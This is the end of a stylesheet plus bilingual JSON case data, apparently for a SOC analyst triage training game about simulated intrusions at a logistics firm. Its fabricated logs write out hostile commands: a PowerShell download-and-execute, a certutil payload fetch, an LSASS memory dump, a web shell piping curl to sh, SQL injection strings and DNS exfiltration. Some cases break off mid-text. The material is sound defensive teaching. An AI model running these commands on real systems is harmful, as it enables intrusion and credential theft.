  .seg-movil button[aria-pressed='true'] { background: var(--surface); color: var(--ink); box-shadow: 0 0 0 1px var(--hair-2), var(--sh-panel); }
  .puesto { grid-template-columns: minmax(0, 1fr); }
  .puesto > .panel { display: none; position: static; max-height: none; }
  .puesto[data-panel-activo='cola'] > .cola, .puesto[data-panel-activo='caso'] > .caso, .puesto[data-panel-activo='ticket'] > .ticket { display: block; }
  .kpis { grid-template-columns: repeat(2, minmax(0, 1fr)); }
  .hist-rej { grid-template-columns: minmax(0, 1fr); }
  .regleta { margin: 0 10px 22px; }
  .regleta .tick:nth-child(even) span { display: none; }
}
@media (max-width: 640px) {
  .barra-in { gap: 4px; padding: 6px 8px; }

  .dlg-cuerpo { padding: 8px 18px 18px; }
  .tc-pie .btn { margin-left: 0; width: 100%; }
}
@media (prefers-reduced-motion: reduce) {

}
@media (prefers-reduced-transparency: reduce) {

}

oyee copies 412 payroll files to USB. She has read access through a temporary grant nobody removed, so technically she can, but the context does not fit. It is a possible personal data leak: escalate to tier 2 (and, through them, HR and data protection). Do not contain blindly: there may be an explanation and it affects a person."}},{"id":"T1-08","hora":"13:30","sev":"critica","fuente":"SIEM","regla":{"es":"RDP accesible desde Internet","en":"RDP reachable from the Internet"},"titulo":{"es":"Sesión de escritorio remoto desde Internet a un servidor","en":"Remote desktop session from the Internet to a server"},"resumen":{"es":"El cortafuegos permite una conexión al 3389 desde una IP externa con NAT a un servidor interno.","en":"The firewall allows a connection to 3389 from an external IP with NAT to an internal server."},"logs":[["13:22:04","fw01","ALLOW tcp 203.0.113.80:61544 -> 192.0.2.10:3389 nat=10.20.0.30:3389 rule=TEMP-PROVEEDOR"],["13:22:40","win-SRV-SQL01","EventID=4625 TargetUserName=administrador IpAddress=203.0.113.80 LogonType=10"],["13:23:02","win-SRV-SQL01","EventID=4624 TargetUserName=administrador IpAddress=203.0.113.80 LogonType=10"],["13:25:30","win-SRV-SQL01","EventID=4688 NewProcessName=C:\\Users\\Public\\ad.exe SubjectUserName=administrador"],["13:26:12","itsm","regla TEMP-PROVEEDOR creada 2026-06-11 para soporte de un proveedor · caducidad: sin fecha"]],"ruido":{"fuentes":["fw","win"],"n":12},"veredicto":"vp","accion":"contener","campos":[{"id":"ip","label":{"es":"IP externa","en":"External IP"},"ok":["203.0.113.80"]},{"id":"equipo","label":{"es":"Servidor alcanzado","en":"Server reached"},"ok":["SRV-SQL01"]}],"mitre":"T1133","claves":["203.0.113.80","SRV-SQL01","TEMP-PROVEEDOR"],"competencias":["triaje","red","respuesta"],"explica":{"es":"Una regla temporal olvidada expone el RDP de la base de datos de pedidos. Desde Internet alguien entra como «administrador» al segundo intento y ejecuta un binario desde C:\\Users\\Public. Es crítico: se contie irector está volando. SPF y DKIM pasan porque el atacante controla su propio dominio: pasar la autenticación no significa que sea legítimo. Lo urgente no es técnico: escalar ya para que Finanzas pare la transferencia por teléfono y bloquear el dominio.","en":"The domain has a hyphen the real one lacks and was registered six days ago; the director is on a plane. SPF and DKIM pass because the attacker controls their own domain: passing authentication does not make it legitimate. The urgent part is not technical: escalate now so Finance stops the transfer by phone, and block the domain."}},{"id":"T2-08","hora":"14:20","sev":"alta","fuente":"Correo","regla":{"es":"Regla de reenvío a dominio externo","en":"Forwarding rule to an external domain"},"titulo":{"es":"Un buzón de Finanzas reenvía todo a una dirección externa","en":"A Finance mailbox forwards everything to an external address"},"resumen":{"es":"Se crea una regla de bandeja de entrada en el buzón de m.ortega.","en":"An inbox rule is created on m.ortega's mailbox."},"logs":[["14:16:02","entra","SignIn result=success user=m.ortega@nortelogistica.example app=OWA ip=203.0.113.99 device=unknown"],["14:17:30","exchange","New-InboxRule mailbox=m.ortega name='.' ForwardTo=m.ortega.personal@correo.example DeleteMessage=True ip=203.0.113.99"],["14:18:00","exchange","forwarded messages=3 to=m.ortega.personal@correo.example"]],"ruido":{"fuentes":["entra","mail"],"n":12},"veredicto":"vp","accion":"contener","campos":[{"id":"destino","label":{"es":"Dirección de destino","en":"Destination address"},"ok":["m.ortega.personal@correo.example"]},{"id":"ip","label":{"es":"IP desde la que se crea","en":"IP it was created from"},"ok":["203.0.113.99"]}],"mitre":"T1114.003","claves":["203.0.113.99","m.ortega.personal@correo.example"],"competencias":["triaje","correo","identidad","respuesta"],"explica":{"es":"La IP es la misma del C2 del adjunto con macros de esta mañana (T2-02): el atacante robó la sesión de m.ortega y ahora se queda con werShell's parent process"},"ok":["wscript.exe"]}],"mitre":"T1059.001","claves":["198.51.100.66","PC-ALM-021","wscript"],"competencias":["triaje","endpoint","logs","respuesta"],"explica":{"es":"El Base64 de -enc va en UTF-16LE: decodificado dice IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.66/a.ps1'), es decir, descargar y ejecutar en memoria. Lo lanza un .js de Descargas abierto con wscript, y el proxy confirma la descarga. Aislar PC-ALM-021 y bloquear la IP. Decodificar comandos es tarea diaria de un N1.","en":"The -enc Base64 is UTF-16LE: decoded it reads IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.66/a.ps1'), i.e. download and run in memory. A .js from Downloads opened with wscript launches it, and the proxy confirms the download. Isolate PC-ALM-021 and block the IP. Decoding commands is daily work for tier 1."}},{"id":"T3-02","hora":"09:00","sev":"alta","fuente":"EDR","regla":{"es":"Binario del sistema usado para descargar","en":"System binary used to download"},"titulo":{"es":"certutil descarga un ejecutable","en":"certutil downloads an executable"},"resumen":{"es":"certutil.exe con -urlcache en PC-FIN-007.","en":"certutil.exe with -urlcache on PC-FIN-007."},"logs":[["08:57:44","edr","process=certutil.exe parent=cmd.exe user=soporte$ host=PC-FIN-007 cmd='certutil -urlcache -split -f http://203.0.113.12/upd.exe C:\\Users\\Public\\upd.exe'"],["08:57:45","fw01","ALLOW tcp 10.20.3.41:50433 -> 203.0.113.12:80"],["08:57:47","edr","file_create host=PC-FIN-007 path=C:\\Users\\Public\\upd.exe sha256=9f2c...e01a signed=false"],["08:58:02","edr","process=upd.exe parent=cmd.exe user=soporte$ host=PC-FIN-007"]],"ruido":{"fuentes":["edr","fw"],"n":12},"veredicto":"vp","accion":"contener","campos":[{"id":"ruta","label":{"es":"Ruta del fichero descargado","en":"Path of the downloaded file"},"ok":["C:\\Users\\Public\\upd.exe"]},{"id":"cuenta","label":{"es":"Cuenta que lo ejecuta","en":"Account running it"},"ok":["soporte$"]}],"mitre":"T1105","claves":["upd.exe","203.0.113.12","soporte$"],"competencias":["triaje","endpoint","respuesta"],"explica":{"es":"certutil sirve para certificados, pero los atacantes lo usan para descargar porque viene firmado por Microsoft (un «LOLBin»). Lo ejecuta soporte$, la cuenta creada el lunes en este mismo equipo (T1-04): el compromiso de PC-FIN-007 avanza. Aislar, bloquear 203.0.113.12 y enlazar con T1-04.","en":"certutil is for certificates, but attackers use it to download because Microsoft signs it (a «LOLBin»). It runs as soporte$, the account created on Monday on this same PC (T1-04): the PC-FIN-007 compromise is progressing. Isolate, block 203.0.113.12 and link to T1-04."}},{"id":"T3-03","hora":"09:45","sev":"media","fuente":"EDR","regla":{"es":"Ejecución remota con PsExec","en":"Remote execution with PsExec"},"titulo":{"es":"PsExec contra varios equipos a la vez","en":"PsExec against several hosts at once"},"resumen":{"es":"adm.rvela usa PsExec desde PAW-01 contra 14 equipos.","en":"adm.rvela uses PsExec from PAW-01 against 14 hosts."},"logs":[["09:30:00","itsm","CHG-2077 aprobado: despliegue del agente de inventario v4.2 en Almacen · responsable adm.rvela · metodo PsExec · ventana 09:30-10:30"],["09:41:10","edr","process=PsExec64.exe parent=powershell.exe user=adm.rvela host=PAW-01 signer='Microsoft Corporation' cmd='PsExec64 @almacen.txt -s msiexec /i \\\\SRV-FS01\\deploy\\inventario-4.2.msi /qn'"],["09:41:12","win-PC-ALM-014","EventID=7045 ServiceName=PSEXESVC ImagePath=%SystemRoot%\\PSEXESVC.exe AccountName=LocalSystem"],["09:43:50","edr","summary PsExec targets=14 hosts=PC-ALM-* result=ok"]],"ruido":{"fuentes":["edr","win"],"n":12},"veredicto":"benigno","accion":"cerrar","campos":[{"id":"cambio","label":{"es":"Cambio que lo autoriza","en":"Change that authorises it"},"ok":["CHG-2077"]}],"mitre":null,"claves":["CHG-2077","adm.rvela","PAW-01"],"competencias":["triaje","endpoint","comunicacion"],"explica":{"es":"PsExec es la misma herramienta que usan los atacantes para moverse, por eso salta la alerta. Aquí lo lanza el administrador desde su estación segura, para instalar un MSI interno en los equipos de Almacén y dentro de la ventana de CHG-2077. Benigno: se cierra citando el cambio.","en":"PsExec is the same tool attackers use to move laterally, which is why the alert fires. Here the admin runs it from his privileged workstation, to install an internal MSI on Warehouse PCs within the CHG-2077 window. Benign: close it citing the change."}},{"id":"T3-04","hora":"10:25","sev":"critica","fuente":"EDR","regla":{"es":"Acceso a la memoria de LSASS","en":"LSASS memory access"},"titulo":{"es":"Volcado de LSASS en el servidor de ficheros","en":"LSASS dump on the file server"},"resumen":{"es":"rundll32 con comsvcs.dll y MiniDump en SRV-FS01.","en":"rundll32 with comsvcs.dll and MiniDump on SRV-FS01."},"logs":[["10:22:31","win-SRV-FS01","EventID=4624 LogonType=3 TargetUserName=soporte$ IpAddress=10.20.3.41"],["10:23:05","edr","process=rundll32.exe parent=cmd.exe user=soporte$ host=SRV-FS01 cmd='rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 712 C:\\Windows\\Temp\\d.dmp full'"],["10:23:06","edr","process_access host=SRV-FS01 source=rundll32.exe target=lsass.exe pid=712 access=0x1fffff"],["10:23:40","edr","file_create host=SRV-FS01 path=C:\\Windows\\Temp\\d.dmp size=48MB"]],"ruido":{"fuentes":["edr","win"],"n":12},"veredicto":"vp","accion":"contener","campos":[{"id":"cuenta","label":{"es":"Cuenta usada","en":"Account used"},"ok":["soporte$"]},{"id":"origen","label":{"es":"IP de la que viene la sesión","en":"IP the session comes from"},"ok":["10.20.3.41"]}],"mitre":"T1003.001","claves":["SRV-FS01","lsass","soporte$"],"competencias":["triaje","endpoint","identidad","respuesta"],"explica":{"es":"comsvcs.dll MiniDump contra el PID de lsass.exe es volcado de credenciales: quien tenga d.dmp tiene los secretos de quien haya iniciado sesión en SRV-FS01. La sesión viene de 10.20.3.41 (PC-FIN-007) con soporte$. Crítico: aislar SRV-FS01 y PC-FIN-007, deshabilitar soporte$ y escalar como incidente con todos los tickets enlazados.","en":"comsvcs.dll MiniDump against lsass.exe's PID is credential dumping: whoever has d.dmp has the secrets of everyone logged on to SRV-FS01. The session comes from 10.20.3.41 (PC-FIN-007) as soporte$. Critical: isolate SRV-FS01 and PC-FIN-007, disable soporte$ and escalate as an incident with every ticket linked."}},{"id":"T3-05","hora":"11:00","sev":"media","fuente":"SIEM","regla":{"es":"Tarea programada creada desde la línea de comandos","en":"Scheduled task created from the command line"},"titulo":{"es":"Tarea programada que ejecuta un binario de C:\\Users\\Public","en":"Scheduled task running a binary from C:\\Users\\Public"},"resumen":{"es":"Evento 4698 en PC-FIN-007 con un nombre que imita a OneDrive.","en":"Event 4698 on PC-FIN-007 with a name mimicking OneDrive."},"logs":[["10:58:12","win-PC-FIN-007","EventID=4688 CommandLine='schtasks /create /tn OneDriveUpdate /tr C:\\Users\\Public\\upd.exe /sc onlogon /ru SYSTEM' SubjectUserName=soporte$"],["10:58:12","win-PC-FIN-007","EventID=4698 TaskName=\\OneDriveUpdate SubjectUserName=soporte$"],["10:58:30","edr","baseline: OneDrive legitimo se actualiza con 'OneDrive Standalone Update Task-S-1-5-21...' desde %LocalAppData%\\Microsoft\\OneDrive"]],"ruido":{"fuentes":["win","edr"],"n":12},"veredicto":"vp","accion":"contener","campos":[{"id":"tarea","label":{"es":"Nombre de la tarea","en":"Task name"},"ok":["OneDriveUpdate","\\OneDriveUpdate"]},{"id":"binario","label":{"es":"Binario que ejecuta","en":"Binary it runs"},"ok":["C:\\Users\\Public\\upd.exe","upd.exe"]}],"mitre":"T1053.005","claves":["OneDriveUpdate","upd.exe"],"competencias":["triaje","endpoint","respuesta"],"explica":{"es":"La tarea imita a OneDrive pero ejecuta como SYSTEM el upd.exe descargado con certutil (T3-02) en cada inicio de sesión: es persistencia. La legítima tiene otro nombre y otra ruta. Contener: borrar la tarea y el binario forma parte de la limpieza que coordina el N2; el equipo ya debería estar aislado.","en":"The task mimics OneDrive but runs the upd.exe downloaded with certutil (T3-02) as SYSTEM at every logon: persistence. The legitimate one has a different name and path. Contain: removing the task and binary is part of the clean-up tier 2 coordinates; the PC should already be isolated."}},{"id":"T3-06","hora":"11:40","sev":"baja","fuente":"EDR","regla":{"es":"Detección heurística de baja confianza","en":"Low-confidence heuristic detection"},"titulo":{"es":"El EDR marca el actualizador de un lector de PDF","en":"The EDR flags a PDF reader updater"},"resumen":{"es":"AdobeARM.exe marcado como sospechoso en tres equipos tras su actualización.","en":"AdobeARM.exe flagged as suspicious on three PCs after its update."},"logs":[["11:35:00","edr","detection host=PC-MKT-002 file=C:\\Program Files (x86)\\Common Files\\Adobe\\ARM\\1.0\\AdobeARM.exe confidence=low reason=new_binary_prevalence"],["11:35:01","edr","file_info AdobeARM.exe signer='Adobe Inc.' signature=valid sha256=4b1d...77ac first_seen=hoy prevalence_global=2.1M"],["11:35:02","edr","detection host=PC-ALM-014 file=AdobeARM.exe confidence=low (mismo sha256)"],["11:35:40","proxy01","GET https://armmf.adobe.example/arm-manifests/win/ArmManifest3.msi 200"]],"ruido":{"fuentes":["edr","proxy"],"n":12},"veredicto":"fp","accion":"cerrar","campos":[{"id":"prueba","label":{"es":"Qué confirma que es legítimo","en":"What confirms it is legitimate"},"ok":["firma","firma digital","firma valida","firmado","signature","digital signature","valid signature","signed"],"derivado":true}],"mitre":null,"claves":["Adobe","firma"],"competencias":["triaje","endpoint"],"explica":{"es":"Firma válida de Adobe, ruta de instalación estándar, millones de equipos con el mismo hash y una descarga desde el servidor de actualizaciones. El motivo de la alerta es solo que el binario es nuevo hoy. Falso positivo: se cierra y se propone añadir el hash a la lista de confianza.","en" an de respuesta. El aviso a dirección lo da el N2 o el responsable de incidentes.","en":"Ransomware in progress: it encrypts over the network from 10.20.3.41 (PC-FIN-007) as soporte$, drops a ransom note and tries to delete backup shadow copies. Every minute counts: isolate PC-FIN-007 and SRV-FS01, disable soporte$ and trigger the response plan. Tier 2 or the incident lead informs management."}},{"id":"T3-08","hora":"13:50","sev":"media","fuente":"SIEM","regla":{"es":"RDP interno poco habitual","en":"Unusual internal RDP"},"titulo":{"es":"Un técnico abre RDP contra la base de datos","en":"A technician opens RDP to the database"},"resumen":{"es":"Primera conexión RDP de h.diaz a SRV-SQL01 en 90 días.","en":"First RDP connection from h.diaz to SRV-SQL01 in 90 days."},"logs":[["13:40:00","itsm","INC-5521 asignado a h.diaz: 'SRV-SQL01 sin espacio en C:, la aplicación de pedidos no guarda' · prioridad alta"],["13:47:20","win-SRV-SQL01","EventID=4624 LogonType=10 TargetUserName=h.diaz IpAddress=10.20.6.8 WorkstationName=PC-SOP-002"],["13:49:05","win-SRV-SQL01","EventID=4688 NewProcessName=cleanmgr.exe SubjectUserName=h.diaz"],["13:55:40","itsm","INC-5521 nota: 'liberados 18 GB de registros antiguos, aplicación operativa'"]],"ruido":{"fuentes":["win"],"n":12},"veredicto":"benigno","accion":"cerrar","campos":[{"id":"ticket","label":{"es":"Ticket que lo justifica","en":"Ticket that explains it"},"ok":["INC-5521"]}],"mitre":null,"claves":["INC-5521","h.diaz"],"competencias":["triaje","identidad","comunicacion"],"explica":{"es":"Lo raro no siempre es malo: h.diaz tiene asignada una incidencia urgente justo en ese servidor, entra desde su equipo de soporte y lo que hace (liberar disco) encaja con el ticket. Benigno, cerrado con INC-5521. Después de lo que ha pasado esta semana, conviene comprobarlo siempre antes de cerrar.","en":"Unusual is not always bad: h.diaz has an urgent incident assigned on exactly that server, connects from his helpdesk PC and what he does (free disk space) matches the ticket. Benign, closed with INC-5521. After this week, it is worth checking every time before closing."}}]},"t4":{"id":"T4","dia":{"es":"Jueves","en":"Thursday"},"tema":{"es":"Red y aplicaciones web","en":"Network and web apps"},"casos":[{"id":"T4-01","hora":"08:10","sev":"media","fuente":"WAF","regla":{"es":"Firmas de inyección SQL","en":"SQL injection signatures"},"titulo":{"es":"Intentos de inyección SQL contra el portal de clientes","en":"SQL injection attempts against the customer portal"},"resumen":{"es":"El WAF registra peticiones con UNION SELECT y comillas contra /pedidos.","en":"The WAF logs requests with UNION SELECT and quotes against /pedidos."},"logs":[["08:05:11","waf","block GET /pedidos?id=1' OR '1'='1 from 198.51.100.200 rule=942100 status=403"],["08:05:12","waf","block GET /pedidos?id=1 UNION SELECT usuario,clave FROM clientes-- from 198.51.100.200 rule=942190 status=403"],["08:06:30","waf","summary src=198.51.100.200 requests=212 blocked=212 status_200=0 ua='sqlmap/1.8'"],["08:07:00","web-SRV-WEB01","sin peticiones de 198.51.100.200 en el servidor de aplicaciones (todas paradas en el WAF)"]],"ruido":{"fuentes":["waf","web"],"n":12},"veredicto":"vp","accion":"cerrar","campos":[{"id":"estado","label":{"es":"Código HTTP que recibió el atacante","en":"HTTP status the attacker got"},"ok":["403"]},{"id":"herramienta","label":{"es":"Herramienta que usa","en":"Tool being used"},"ok":["sqlmap"]}],"mitre":"T1190","claves":["198.51.100.200","403","sqlmap"],"competencias":["triaje","red","logs"],"explica":{"es":"Es un ataque real con sqlmap (verdadero positivo), pero las 212 peticiones recibieron 403 y ninguna llegó al servidor. El control funcionó: se documenta, se bloquea la IP si la política lo pide y se cierra. Lo que obligaría a escalar es un solo 200 con firma de inyección.","en":"It is a real sqlmap attack (true positive), but all 212 requests got 403 and none reached the server. The control worked: document it, block the IP if policy says so, and close. What would force an escalation is a single 200 with an injection signature."}},{"id":"T4-02","hora":"08:55","sev":"critica","fuente":"WAF","regla":{"es":"Ejecución de comandos en parámetro web","en":"Command execution in a web parameter"},"titulo":{"es":"Un fichero subido responde a comandos del sistema","en":"An uploaded file answers system commands"},"resumen":{"es":"Peticiones con ?cmd= a un .php dentro de /uploads/ devuelven 200.","en":"Requests with ?cmd= to a .php under /uploads/ return 200."},"logs":[["08:49:02","web-SRV-WEB01","203.0.113.150 - - \"POST /perfil/avatar HTTP/1.1\" 200 512 file=avatar.php content-type=image/png"],["08:50:40","web-SRV-WEB01","203.0.113.150 - - \"GET /uploads/avatar.php?cmd=whoami HTTP/1.1\" 200 21"],["08:51:15","web-SRV-WEB01","203.0.113.150 - - \"GET /uploads/avatar.php?cmd=cat%20/etc/passwd HTTP/1.1\" 200 1840"],["08:53:02","edr","process=sh parent=php-fpm user=www-data host=SRV-WEB01 cmd='curl -s http://203.0.113.150/k | sh'"]],"ruido":{"fuentes":["web","waf"],"n":12},"veredicto":"vp","accion":"contener","campos":[{"id":"ruta","label":{"es":"Ruta del web shell","en":"Web shell path"},"ok":["/uploads/avatar.php"]},{"id":"ip","label":{"es":"IP del atacante","en":"Attacker IP"},"ok":["203.0.113.150"]}],"mitre":"T1505.003","claves":["/uploads/avatar.php","203.0.113.150"],"competencias":["triaje","red","logs","respuesta"],"explica":{"es":"El formulario de avatar aceptó un .php declarado como imagen, y ahora ese fichero ejecuta comandos (200 con contenido) y ya descarga una segunda fase. Es un web shell activo en el servidor público: contener aislando SRV-WEB01 o retirándolo del balanceador, bloquear la IP y escalar como incidente.","en":"The avatar form accepted a .php declared as an image, and now that file runs commands (200 with content) and is already pulling a second stage. It is a live web shell on the public server: contain by isolating SRV-WEB01 or pulling it from the load balancer, block the IP and escalate as an incident."}},{"id":"T4-03","hora":"09:35","sev":"media","fuente":"SIEM","regla":{"es":"Escaneo interno de puertos","en":"Internal port scan"},"titulo":{"es":"Un equipo interno recorre toda la red","en":"An internal host sweeps the whole network"},"resumen":{"es":"10.20.5.15 conecta con 250 equipos y miles de puertos.","en":"10.20.5.15 touches 250 hosts and thousands of ports."},"logs":[["07:00:00","itsm","CHG-2090 aprobado: escaneo trimestral de vulnerabilidades · origen SCAN-01 (10.20.5.15) · alcance 10.20.0.0/16 · ventana 07:00-12:00"],["09:31:10","fw02","ALLOW tcp 10.20.5.15:44102 -> 10.20.2.0/24 ports=1-1024 count=6144"],["09:33:40","win-SRV-FS01","EventID=4625 TargetUserName=svc_scan IpAddress=10.20.5.15 LogonType=3 (credencial de escaneo autenticado, contraseña rotada ayer)"],["09:34:10","scan01","Nessus 10.8 scan='Trimestral Q4' status=running hosts_done=118/250"]],"ruido":{"fuentes":["fw","win"],"n":12},"veredicto":"benigno","accion":"cerrar","campos":[{"id":"cambio","label":{"es":"Cambio que lo autoriza","en":"Change that authorises it"},"ok":["CHG-2090"]},{"id":"cuenta","label":{"es":"Cuenta con fallos de inicio de sesión","en":"Account with failed logons"},"ok":["svc_scan"]}],"mitre":null,"claves":["CHG-2090","SCAN-01"],"competencias":["triaje","red","comunicacion"],"explica":{"es":"Origen, alcance y ventana coinciden con CHG-2090: es el escaneo trimestral, benigno. Pero hay un detalle útil: svc_scan falla al autenticarse porque su contraseña se rotó ayer, así que el escaneo autenticado saldrá incompleto. Se cierra y se avisa a IT. Así aporta valor un buen N1.","en":"Source, scope and window match CHG-2090: it is the quarterly scan, benign. But there is a useful detail: svc_scan fails to authenticate because its password was rotated yesterday, so the credentialed scan will be incomplete. Close it and tell IT. That is how a good tier 1 adds value."}},{"id":"T4-04","hora":"10:15","sev":"alta","fuente":"SIEM","regla":{"es":"Comunicación periódica "fuente":"SIEM","regla":{"es":"Consultas DNS anómalas","en":"Anomalous DNS queries"},"titulo":{"es":"Subdominios larguísimos contra un mismo dominio","en":"Very long subdomains against one domain"},"resumen":{"es":"Miles de consultas TXT con etiquetas de casi 60 caracteres desde 10.20.3.33.","en":"Thousands of TXT queries with labels close to 60 characters from 10.20.3.33."},"logs":[["11:01:12","dns","query TXT 4e6f6d696e61735f323032362e786c73782d70617274303031.t.exfil-data.example from 10.20.3.33"],["11:01:12","dns","query TXT 0a1f9c33e2b7d4a8c6e0f1b2a3d4c5e6f7a8b9c0d1e2f3a4b5.t.exfil-data.example from 10.20.3.33"],["11:03:00","dns","summary src=10.20.3.33 domain=exfil-data.example queries=6420/10m unique_subdomains=6419 avg_label_len=58"],["11:03:05","note","el primer subdominio en hexadecimal se lee 'Nominas_2026.xlsx-part001'"]],"ruido":{"fuentes":["dns"],"n":14},"veredicto":"vp","accion":"contener","campos":[{"id":"dominio","label":{"es":"Dominio usado","en":"Domain used"},"ok":["exfil-data.example"]},{"id":"equipo","label":{"es":"IP del equipo que consulta","en":"IP of the querying host"},"ok":["10.20.3.33"]}],"mitre":"T1048.003","claves":["exfil-data.example","10.20.3.33"],"competencias":["triaje","red","logs","respuesta"],"explica":{"es":"Casi cada consulta es un subdominio único y codificado: los datos salen troceados dentro de las preguntas DNS, y el primero decodifica como un fichero de nóminas. 10.20.3.33 es PC-FIN-003, el equipo comprometido por la macro del martes. Contener: aislar el equipo y bloquear el dominio en el DNS.","en":"Almost every query is a unique encoded subdomain: data leaves in chunks inside DNS questions, and the first one decodes as a payroll file. 10.20.3.33 is PC-FIN-003, the PC compromised by Tuesday's macro. Contain: isolate the host and sinkhole the domain in DNS."},"mitreAlt":["T1071.004"]},{"id":"T4-06","hora":"11:50","sev":"media","fuente":"Proxy","regla":{"es":"Subida grande a almacenamiento personal","en":"Large upload to personal storage"},"titulo":{"es":"3,4 GB subidos a una nube personal","en":"3.4 GB uploaded to a personal cloud"},"resumen":{"es":"Subida de un ZIP a un servicio de almacenamiento no corporativo.","en":"A ZIP uploaded to a non-corporate storage service."},"logs":[["11:41:00","proxy01","user=j.romero POST https://files.example/upload?name=clientes_completo_2026.zip 200 bytes_out=3.4GB category=personal_storage"],["11:41:02","dlp","match file=clientes_completo_2026.zip patterns=dni,iban,email count=18402"],["11:42:10","ad","j.romero baja voluntaria comunicada 2026-10-30 · ultimo dia 2026-11-14"],["11:42:12","itsm","busqueda peticiones de j.romero para files.example: ninguna"]],"ruido":{"fuentes":["proxy"],"n":12},"veredicto":"vp","accion":"escalar","campos":[{"id":"usuario","label":{"es":"Usuario","en":"User"},"ok":["j.romero"]},{"id":"fichero","label":{"es":"Fichero subido","en":"Uploaded file"},"ok":["clientes_completo_2026.zip"]}],"mitre":"T1567.002","claves":["j.romero","clientes_completo_2026.zip"],"competencias":["triaje","red","comunicacion"],"explica":{"es":"Una persona que deja la empresa en dos semanas sube a su nube personal 18 402 registros de clientes con DNI e IBAN, sin ninguna petición. Es una posible fuga de datos personales con implicaciones legales y de RR. HH.: se escala a N2 con todas las evidencias. Un N1 no contiene ni contacta con la persona por su cuenta.","en":"Someone leaving the company in two weeks uploads 18,402 customer records with ID numbers and IBANs to their personal cloud, with no request on file. It is a possible personal data leak with legal and HR implications: escalate to tier 2 with all the evidence. Tier 1 neither contains nor contacts the person on their own."}},{"id":"T4-07","hora":"12:40","sev":"media","fuente":"SIEM","regla":{"es":"Conexión a IP de la lista de TOR","en":"Connection to an IP on the TOR list"},"titulo":{"es":"Tráfico hacia una IP marcada como nodo TOR","en":"Traffic to an IP flagged as a TOR node"},"resumen":{"es":"Todos los servidores conectan con 198.51.100.9, que la fuente de amenazas marca como TOR desde hoy.","en":"Every server connects to 198.51.100.9, which the threat feed flags as TOR since today."},"logs":[["12:30:00","ti","feed TOR-relays actualizado: +312 IP · incluye 198.51.100.9"],["12:35:10","fw01","ALLOW udp 10.20.0.10:123 -> 198.51.100.9:123"],["12:35:10","fw01","ALLOW udp 10.20.0.20:123 -> 198.51.100.9:123"],["12:35:11","dns","198.51.100.9 PTR ntp1.proveedor-hora.example · configurado como servidor NTP en GPO 'Hora-Dominio' desde 2024"],["12:36:00","ti","aviso del proveedor de la fuente: 'la actualizacion de las 12:30 incluyo por error un bloque de servidores NTP; se corregira a las 14:00'"]],"ruido":{"fuentes":["fw","dns"],"n":12},"veredicto":"fp","accion":"cerrar","campos":[{"id":"puerto","label":{"es":"Puerto de destino","en":"Destination port"},"ok":["123","udp/123","123/udp"]},{"id":"servicio","label":{"es":"Servicio real de esa IP","en":"Real service at that IP"},"ok":["ntp"]}],"mitre":null,"claves":["ntp","198.51.100.9"],"competencias":["triaje","red","logs"],"explica":{"es":"El tráfico es UDP/123 hacia el servidor de hora que el dominio usa desde 2024; lo que cambió hoy fue la fuente de inteligencia, que metió esa IP por error y el proveedor ya lo ha reconocido. Falso positivo: se cierra y se propone excluir la IP hasta que llegue la corrección. Bloquearla habría desincronizado la hora del dominio y roto Kerberos.","en":"The traffic is UDP/123 to the time server the domain has used since 2024; what changed today was the intelligence feed, which added that IP by mistake, and the provider has already admitted it. False positive: close it and propose excluding the IP until the fix lands. Blocking it would have broken domain time sync and Kerberos."}},{"id":"T4-08","hora":"13:30","sev":"alta","fuente":"EDR","regla":{"es":"Conexión a pool de minería","en":"Connection to a mining pool"},"titulo":{"es":"El servidor web al 100 % de CPU","en":"The web server at 100 % CPU"},"resumen":{"es":"Un proceso con nombre de hilo del núcleo consume toda la CPU de SRV-WEB01.","en":"A process named like a kernel thread eats all of SRV-WEB01's CPU."},"logs":[["13:20:00","edr","process=kworkerds parent=sh user=www-data host=SRV-WEB01 path=/tmp/.x/kworkerds cpu=98%"],["13:20:02","fw01","ALLOW tcp 10.20.1.15:39020 -> 203.0.113.77:3333"],["13:20:05","edr","network host=SRV-WEB01 process=kworkerds payload='{\"method\":\"mining.subscribe\"}'"],["13:21:00","edr","crontab www-data: '*/5 * * * * /tmp/.x/kworkerds' creado 08:54"]],"ruido":{"fuentes":["edr","fw"],"n":12},"veredicto":"vp","accion":"contener","campos":[{"id":"puerto","label":{"es":"Puerto del pool","en":"Pool port"},"ok":["3333"]},{"id":"proceso","label":{"es":"Proceso malicioso","en":"Malicious process"},"ok":["kworkerds"]}],"mitre":"T1496","claves":["kworkerds","3333","SRV-WEB01"],"competencias":["triaje","endpoint","red","respuesta"],"explica":{"es":"Los hilos del núcleo no viven en /tmp ni los lanza www-data; «mining.subscribe» al puerto 3333 es el protocolo Stratum de minería. El cron se creó a las 08:54, justo después del web shell de T4-02: es la misma intrusión. Contener: SRV-WEB01 sigue comprometido y el N2 debe saber que hay persistencia.","en":"Kernel threads do not live in /tmp nor run as www-data; «mining.subscribe» on port 3333 is the Stratum mining protocol. The cron job was created at 08:54, right after the T4-02 web shell: same intrusion. Contain: SRV-WEB01 is still compromised and tier 2 needs to know there is persistence."}}]},"t5":{"id":"T5","dia":{"es":"Viernes","en":"Friday"},"tema":{"es":"Identidades y directorio activo","en":"Identities and Active Directory"},"casos":[{"id":"T5-01","hora":"08:05","sev":"alta","fuente":"SIEM","regla":{"es":"Muchos tickets de servicio con cifrado débil","en":"Many service tickets with weak encryption"},"titulo":{"es":"Una cuenta pide tickets para todos los servicios en un minuto","en":"One account requests tickets for every service in a minute"},"resumen":{"es":"Eventos 4769 con TicketEncryptionType 0x17 para 23 SPN distintos.","en":"4769 events with TicketEncryptionType 0x17 for 23 different SPNs."},"logs":[["08:02:10","dc","EventID=4769 ServiceName=MSSQLSvc/SRV-SQL01:1433 TargetUserName=l.moreno IpAddress=10.20.2.21 TicketEncryptionType=0x17"],["08:02:10","dc","EventID=4769 ServiceName=svc_backup TargetUserName=l.moreno IpAddress=10.20.2.21 TicketEncryptionType=0x17"],["08:02:11","dc","EventID=4769 ServiceName=HTTP/intranet TargetUserName=l.moreno IpAddress=10.20.2.21 TicketEncryptionType=0x17"],["08:02:58","dc","summary TargetUserName=l.moreno distinct_spn=23 window=48s enc=0x17(RC4)"],["08:03:00","baseline","l.moreno solicita normalmente 2-3 tickets al dia, siempre con 0x12 (AES256)"]],"ruido":{"fuentes":["dc","win"],"n":12},"veredicto":"vp","accion":"contener","campos":[{"id":"cifrado","label":{"es":"Tipo de cifrado pedido","en":"Encryption type 